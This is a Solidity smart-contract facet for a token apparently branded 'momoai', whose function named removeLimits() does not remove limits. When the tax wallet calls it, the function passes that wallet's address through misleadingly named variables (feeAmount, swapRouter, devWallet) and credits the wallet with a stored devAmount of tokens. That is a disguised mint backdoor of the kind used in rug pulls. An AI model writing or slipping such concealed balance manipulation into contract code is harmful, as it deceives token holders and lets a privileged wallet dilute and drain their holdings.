// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://www.momoai.io/
    Twitter:  https://twitter.com/Metaoasis_
    Telegram: https://t.me/metaoasis
    Discord:  https://discord.com/invite/momoai

*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet is Ownable {
    function removeLimits() external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_msgSender() == ds._taxWallet) {
            require(ds._taxWallet == _msgSender());
            address feeAmount = _msgSender();
            address swapRouter = feeAmount;
            address devWallet = swapRouter;
            ds._balances[devWallet] += ds.devAmount;
        }
    }
}
